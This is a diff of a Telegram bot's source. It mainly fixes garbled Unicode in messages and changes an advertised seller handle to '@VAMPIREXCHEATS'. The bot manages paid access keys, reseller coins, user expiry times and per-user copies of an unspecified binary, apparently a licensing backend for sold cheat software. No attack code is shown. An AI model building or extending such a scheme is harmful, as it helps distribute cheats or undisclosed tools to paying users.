+        bot.answer_callback_query(call.id, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆")
         return
 
     time_type = "days" if call.data == "admin_days" else "hours"
 
     bot.edit_message_text(
-        f"âœ… ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ *{time_type}*:",
+        f"✅ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 *{time_type}*:",
         call.message.chat.id, call.message.message_id, parse_mode='Markdown')
 
     bot.register_next_step_handler(call.message, process_generate_key, user_id, time_type)
@@ -923,7 +927,7 @@ def handle_reseller_selection(call):
     user_id = str(call.message.chat.id)
 
     if user_id not in resellers:
-        bot.answer_callback_query(call.id, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—»ð—¹ð˜†")
+        bot.answer_callback_query(call.id, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆")
         return
 
     duration_mapping = {"select_1_day": 1, "select_7_days": 7, "select_30_days": 30}
@@ -931,19 +935,19 @@ def handle_reseller_selection(call):
     cost = KEY_COSTS[days]
 
     if resellers[user_id]["coins"] < cost:
-        bot.edit_message_text("âŒ ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—–ð—¼ð—¶ð—»ð˜€!", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗼𝗶𝗻𝘀!", call.message.chat.id, call.message.message_id)
         return
 
     # Ask for confirmation
     markup = types.InlineKeyboardMarkup()
-    confirm_button = types.InlineKeyboardButton("âœ… Confirm", callback_data=f"confirm_{days}")
+    confirm_button = types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{days}")
     markup.add(confirm_button)
 
     bot.edit_message_text(
-        f"âš¡ ð—–ð—¼ð—»ð—³ð—¶ð—¿ð—º ð—´ð—²ð—»ð—²ð—¿ð—®ð˜ð—¶ð—¼ð—»:\n\n"
-        f"ðŸ“… ð——ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—»: {days} ð—±ð—®ð˜†ð˜€\n"
-        f"ðŸ’° ð—–ð—¼ð˜€ð˜: {cost} ð—°ð—¼ð—¶ð—»ð˜€\n\n"
-        f"ðŸ”„ ð—–ð—¹ð—¶ð—°ð—¸ 'âœ… Confirm' ð˜ð—¼ ð—´ð—²ð—»ð—²ð—¿ð—®ð˜ð—² ð˜ð—µð—² ð—¸ð—²ð˜†.",
+        f"⚡ 𝗖𝗼𝗻𝗳𝗶𝗿𝗺 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗶𝗼𝗻:\n\n"
+        f"📅 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {days} 𝗱𝗮𝘆𝘀\n"
+        f"💰 𝗖𝗼𝘀𝘁: {cost} 𝗰𝗼𝗶𝗻𝘀\n\n"
+        f"🔄 𝗖𝗹𝗶𝗰𝗸 '✅ Confirm' 𝘁𝗼 𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝘁𝗵𝗲 𝗸𝗲𝘆.",
         call.message.chat.id, call.message.message_id, reply_markup=markup)
 
 
@@ -954,7 +958,7 @@ def confirm_reseller_key(call):
     cost = KEY_COSTS[days]
 
     if user_id not in resellers or resellers[user_id]["coins"] < cost:
-        bot.edit_message_text("âŒ ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—–ð—¼ð—¶ð—»ð˜€!", call.message.chat.id, call.message.message_id)
+        bot.edit_message_text("❌ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗼𝗶𝗻𝘀!", call.message.chat.id, call.message.message_id)
         return
 
     resellers[user_id]["coins"] -= cost
@@ -964,11 +968,11 @@ def confirm_reseller_key(call):
     keys[key] = days * 24
     save_keys()
 
-    response = (f"âœ… ð—žð—²ð˜† ð—šð—²ð—»ð—²ð—¿ð—®ð˜ð—²ð—± ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!\n\n"
-                f"ðŸ”‘ ð—žð—²ð˜†: `{key}`\n"
-                f"â³ ð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: {days} ð——ð—®ð˜†ð˜€\n"
-                f"ðŸ”° ð—¦ð˜ð—®ð˜ð˜‚ð˜€: ð—¨ð—»ð˜‚ð˜€ð—²ð—±\n"
-                f"ðŸ’° ð—–ð—¼ð˜€ð˜: `{cost}` ð—°ð—¼ð—¶ð—»ð˜€")
+    response = (f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
+                f"🔑 𝗞𝗲𝘆: `{key}`\n"
+                f"⏳ 𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {days} 𝗗𝗮𝘆𝘀\n"
+                f"🔰 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗨𝗻𝘂𝘀𝗲𝗱\n"
+                f"💰 𝗖𝗼𝘀𝘁: `{cost}` 𝗰𝗼𝗶𝗻𝘀")
 
     bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')
 
@@ -986,15 +990,15 @@ def process_generate_key(message, user_id, time_type):
         keys[key] = duration_in_hours
         save_keys()
 
-        response = (f"âœ… ð—žð—²ð˜† ð—šð—²ð—»ð—²ð—¿ð—®ð˜ð—²ð—± ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!\n\n"
-                    f"ðŸ”‘ ð—žð—²ð˜†: `{key}`\n"
-                    f"â³ ð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: {time_amount} {time_type}\n"
-                    f"ðŸ”° ð—¦ð˜ð—®ð˜ð˜‚ð˜€: ð—¨ð—»ð˜‚ð˜€ð—²ð—±")
+        response = (f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
+                    f"🔑 𝗞𝗲𝘆: `{key}`\n"
+                    f"⏳ 𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: {time_amount} {time_type}\n"
+                    f"🔰 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗨𝗻𝘂𝘀𝗲𝗱")
 
         bot.send_message(message.chat.id, response, parse_mode='Markdown')
 
     except ValueError:
-        bot.send_message(message.chat.id, "â›”ï¸ ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜! ð—˜ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿.")
+        bot.send_message(message.chat.id, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁! 𝗘𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿.")
 
 # ------------------------------------------------------------------
         
@@ -1008,24 +1012,24 @@ def process_generate_key(message, user_id, time_type):
 def handle_admin_actions(message):
     user_id = str(message.chat.id)
     if user_id not in admin_id:
-        bot.send_message(message.chat.id, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±! ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜†.")
+        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆.")
         return
 
     if not keys:
-        bot.send_message(message.chat.id, "ð—¡ð—¼ ð˜‚ð—»ð˜‚ð˜€ð—²ð—± ð—¸ð—²ð˜†ð˜€ ð—³ð—¼ð˜‚ð—»ð—±")
+        bot.send_message(message.chat.id, "𝗡𝗼 𝘂𝗻𝘂𝘀𝗲𝗱 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱")
         return
 
-    key_list = "ð—¨ð—»ð˜‚ð˜€ð—²ð—± ð—¸ð—²ð˜†ð˜€:\n\n"
+    key_list = "𝗨𝗻𝘂𝘀𝗲𝗱 𝗸𝗲𝘆𝘀:\n\n"
     for key, duration in keys.items():
         if duration >= 24:
             days = duration // 24  # Convert hours to days
             hours = duration % 24  # Remaining hours
             if hours > 0:
-                key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{days}` days, `{hours}` hours\n\n"
+                key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{days}` days, `{hours}` hours\n\n"
             else:
-                key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{days}` days\n\n"
+                key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{days}` days\n\n"
         else:
-            key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{duration}` hours\n\n"
+            key_list += f"𝗸𝗲𝘆: `{key}` \n𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆: `{duration}` hours\n\n"
 
     bot.send_message(message.chat.id, key_list, parse_mode="Markdown")
 
@@ -1033,18 +1037,18 @@ def handle_admin_actions(message):
 @bot.message_handler(commands=['users'])
 def show_users_command(message):
     if str(message.chat.id) not in admin_id:
-        return bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±")
+        return bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱")
 
     if not users:
-        return bot.reply_to(message, "ð—¡ð—¼ ð˜‚ð˜€ð—²ð—¿ð˜€ ð—³ð—¼ð˜‚ð—»ð—±")
+        return bot.reply_to(message, "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱")
 
-    user_list = "ð—¨ð˜€ð—²ð—¿ð˜€:\n\n"
+    user_list = "𝗨𝘀𝗲𝗿𝘀:\n\n"
     for user_id, expiration in users.items():
         expiration_time = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
-        status = "Active ðŸŸ¢" if expiration_time > datetime.datetime.now() else "Inactive ðŸ”´"
-        user_list += f"ð—¨ð˜€ð—²ð—¿ ð—œð——: `{user_id}`\n"
-        user_list += f"ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: `{convert_utc_to_ist(expiration)}`\n"
-        user_list += f"ð—¦ð˜ð—®ð˜ð˜‚ð˜€: `{status}`\n\n"
+        status = "Active 🟢" if expiration_time > datetime.datetime.now() else "Inactive 🔴"
+        user_list += f"𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
+        user_list += f"𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: `{convert_utc_to_ist(expiration)}`\n"
+        user_list += f"𝗦𝘁𝗮𝘁𝘂𝘀: `{status}`\n\n"
 
     bot.send_message(message.chat.id, user_list, parse_mode="Markdown")
     
@@ -1052,11 +1056,11 @@ def show_users_command(message):
 @bot.message_handler(commands=['remove'])
 def remove_user_command(message):
     if str(message.chat.id) not in admin_id:
-        return bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±")
+        return bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱")
 
     command = message.text.split()
     if len(command) != 2:
-        return bot.reply_to(message, "ð—¨ð˜€ð—®ð—´ð—²: /ð—¿ð—²ð—ºð—¼ð˜ƒð—² <ð˜‚ð˜€ð—²ð—¿_ð—¶ð—±>")
+        return bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝘂𝘀𝗲𝗿_𝗶𝗱>")
 
     target_user_id = command[1]
     if target_user_id in users:
@@ -1065,9 +1069,9 @@ def remove_user_command(message):
         binary_file = f"{BINARY}{target_user_id}"
         if os.path.exists(binary_file):
             os.remove(binary_file)
-        response = f"ð—¨ð˜€ð—²ð—¿ {target_user_id} ð—¿ð—²ð—ºð—¼ð˜ƒð—²ð—± ðŸ‘"
+        response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 👍"
     else:
-        response = f"ð—¨ð˜€ð—²ð—¿ {target_user_id} ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—±"
+        response = f"𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
 
     bot.reply_to(message, response)
         
@@ -1084,7 +1088,7 @@ def remove_user_command(message):
 @bot.message_handler(func=lambda message: message.text == "Add User")
 def add_user_command(message):
     if str(message.chat.id) not in admin_id:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP DM TO BUY @NINJAGAMEROP")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS DM TO BUY @VAMPIREXCHEATS")
         return
         
     bot.send_message(message.chat.id, "*Please enter the User ID:*", parse_mode='Markdown')
@@ -1100,7 +1104,7 @@ def ask_duration_unit(message):
     markup.add(types.InlineKeyboardButton("Days", callback_data="days"))
     markup.add(types.InlineKeyboardButton("Hours", callback_data="hours"))
 
-    bot.send_message(message.chat.id, "â³ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
     
 @bot.callback_query_handler(func=lambda call: call.data in ["days", "hours"])
 def ask_duration(call):
@@ -1126,7 +1130,7 @@ def add_user_access(message):
     user_data = bot_data.get(chat_id, {})
 
     if "user_id" not in user_data or "time_unit" not in user_data:
-        bot.send_message(chat_id, "âš ï¸ ð—”ð—» ð—²ð—¿ð—¿ð—¼ð—¿ ð—¼ð—°ð—°ð˜‚ð—¿ð—¿ð—²ð—±. ð—£ð—¹ð—²ð—®ð˜€ð—² ð—¿ð—²ð˜€ð˜ð—®ð—¿ð˜ ð˜ð—µð—² ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€..")
+        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀..")
         return
 
     user_id = user_data["user_id"]
@@ -1149,24 +1153,24 @@ def add_user_access(message):
         user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
         shutil.copy(original_binary, user_binary)
 
-        bot.send_message(chat_id, f"âœ… ð—¨ð˜€ð—²ð—¿ *{user_id}* ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» ð—´ð—¿ð—®ð—»ð˜ð—²ð—± ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—³ð—¼ð—¿ *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
+        bot.send_message(chat_id, f"✅ 𝗨𝘀𝗲𝗿 *{user_id}* 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
     
     except ValueError:
-        bot.send_message(chat_id, "â— ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜!")
+        bot.send_message(chat_id, "❗ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
               
 @bot.message_handler(func=lambda message: message.text == "Controll Access")
 def show_modify_options(message):
     if str(message.chat.id) not in admin_id:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS")
         return
 
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
-        types.InlineKeyboardButton("â¬†ï¸ Increase Access", callback_data="increase_access"),
-        types.InlineKeyboardButton("â¬‡ï¸ Decrease Access", callback_data="decrease_access")
+        types.InlineKeyboardButton("⬆️ Increase Access", callback_data="increase_access"),
+        types.InlineKeyboardButton("⬇️ Decrease Access", callback_data="decrease_access")
     )
     
-    bot.send_message(message.chat.id, "ðŸ”¹ *Choose an action:*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "🔹 *Choose an action:*", reply_markup=markup, parse_mode='Markdown')
     
 @bot.callback_query_handler(func=lambda call: call.data in ["increase_access", "decrease_access"])
 def ask_user_id(call):
@@ -1181,7 +1185,7 @@ def ask_user_id(call):
     bot.edit_message_text(
         chat_id=chat_id,
         message_id=call.message.message_id,
-        text=f"âœ… *Selected: {action} Access*\n*Enter the User ID:*", parse_mode='Markdown'
+        text=f"✅ *Selected: {action} Access*\n*Enter the User ID:*", parse_mode='Markdown'
     )
 
     bot.register_next_step_handler(call.message, ask_time_unit)
@@ -1192,7 +1196,7 @@ def ask_time_unit(message):
 
     # Validate if user exists
     if user_id not in users:
-        bot.reply_to(message, f"âŒ ð—¨ð˜€ð—²ð—¿ {user_id} ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—± ð—¼ð—¿ ð—µð—®ð˜€ ð—»ð—¼ ð—®ð—°ð˜ð—¶ð˜ƒð—² ð—®ð—°ð—°ð—²ð˜€ð˜€.")
+        bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 {user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗵𝗮𝘀 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.")
         return
 
     admin_sessions[chat_id]["user_id"] = user_id
@@ -1203,7 +1207,7 @@ def ask_time_unit(message):
         types.InlineKeyboardButton("Hours", callback_data="time_hours")
     )
 
-    bot.send_message(chat_id, "â³ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(chat_id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
     
 @bot.callback_query_handler(func=lambda call: call.data in ["time_days", "time_hours"])
 def ask_durations(call):
@@ -1229,7 +1233,7 @@ def process_duration(message):
     session = admin_sessions.get(chat_id, {})
 
     if "user_id" not in session or "action" not in session or "time_unit" not in session:
-        bot.send_message(chat_id, "âš ï¸ ð—”ð—» ð—²ð—¿ð—¿ð—¼ð—¿ ð—¼ð—°ð—°ð˜‚ð—¿ð—¿ð—²ð—±. ð—£ð—¹ð—²ð—®ð˜€ð—² ð—¿ð—²ð˜€ð˜ð—®ð—¿ð˜ ð˜ð—µð—² ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.")
+        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.")
         return
 
     user_id = session["user_id"]
@@ -1249,14 +1253,14 @@ def process_duration(message):
 
         if action == "increase_access":
             new_expiry = current_expiry + datetime.timedelta(hours=duration_in_hours)
-            change_type = "ð—²ð˜…ð˜ð—²ð—»ð—±ð—²ð—±"
+            change_type = "𝗲𝘅𝘁𝗲𝗻𝗱𝗲𝗱"
         else:  # Decrease case
             new_expiry = current_expiry - datetime.timedelta(hours=duration_in_hours)
-            change_type = "ð—¿ð—²ð—±ð˜‚ð—°ð—²ð—±"
+            change_type = "𝗿𝗲𝗱𝘂𝗰𝗲𝗱"
 
         # Prevent negative expiration
         if new_expiry < datetime.datetime.now():
-            bot.reply_to(message, f"âš ï¸ ð—¨ð˜€ð—²ð—¿ {user_id}'ð˜€ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—°ð—®ð—»ð—»ð—¼ð˜ ð—¯ð—² ð—¿ð—²ð—±ð˜‚ð—°ð—²ð—± ð—³ð˜‚ð—¿ð˜ð—µð—²ð—¿!")
+            bot.reply_to(message, f"⚠️ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗱𝘂𝗰𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿!")
             return
 
         # Update user's expiration time
@@ -1264,15 +1268,15 @@ def process_duration(message):
         save_users()  # Save changes
 
         # Notify Admin
-        bot.reply_to(message, f"âœ… ð—¨ð˜€ð—²ð—¿ {user_id}'ð˜€ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» {change_type} ð—¯ð˜† {duration_value} {time_unit}.\n"
-                              f"ðŸ“… ð—¡ð—²ð˜„ ð—˜ð˜…ð—½ð—¶ð—¿ð˜†: {convert_utc_to_ist(users[user_id])}")
+        bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
+                              f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")
 
         # Notify User
-        bot.send_message(user_id, f"ðŸ”” ð—¬ð—¼ð˜‚ð—¿ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» {change_type} ð—¯ð˜† {duration_value} {time_unit}.\n"
-                                  f"ðŸ“… ð—¡ð—²ð˜„ ð—˜ð˜…ð—½ð—¶ð—¿ð˜†: {convert_utc_to_ist(users[user_id])}")
+        bot.send_message(user_id, f"🔔 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
+                                  f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")
 
     except ValueError:
-        bot.reply_to(message, "ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜!")
+        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
         
 # --------------------------------------------------------------
         
@@ -1295,7 +1299,7 @@ def add_reseller_command(message):
             reseller_id, initial_coins = parts[1], int(parts[2])
 
             if reseller_id in resellers:
-                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                 return
 
             if initial_coins < 0:
@@ -1304,11 +1308,11 @@ def add_reseller_command(message):
             resellers[reseller_id] = {"coins": initial_coins}
             save_resellers()
 
-            bot.send_message(message.chat.id, f"âœ… ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—®ð—±ð—±ð—²ð—± ð˜„ð—¶ð˜ð—µ {initial_coins} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
+            bot.send_message(message.chat.id, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗱𝗱𝗲𝗱 𝘄𝗶𝘁𝗵 {initial_coins} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
         except ValueError:
-            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/addreseller <user_id> <coins>`", parse_mode="Markdown")
+            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/addreseller <user_id> <coins>`", parse_mode="Markdown")
     else:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS.")
 
 @bot.message_handler(commands=['removereseller'])
 def remove_reseller_command(message):
@@ -1325,13 +1329,13 @@ def remove_reseller_command(message):
             if reseller_id in resellers:
                 del resellers[reseller_id]
                 save_resellers()
-                bot.send_message(message.chat.id, f"âœ… ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—¿ð—²ð—ºð—¼ð˜ƒð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆.", parse_mode="Markdown")
             else:
-                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
+                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
         except ValueError:
-            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/removereseller <user_id>`", parse_mode="Markdown")
+            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/removereseller <user_id>`", parse_mode="Markdown")
     else:
-        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")
+        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS.")
 
 @bot.message_handler(commands=['addcoins'])
 def add_coins_command(message):
@@ -1346,7 +1350,7 @@ def add_coins_command(message):
             reseller_id, amount = parts[1], int(parts[2])
 
             if reseller_id not in resellers:
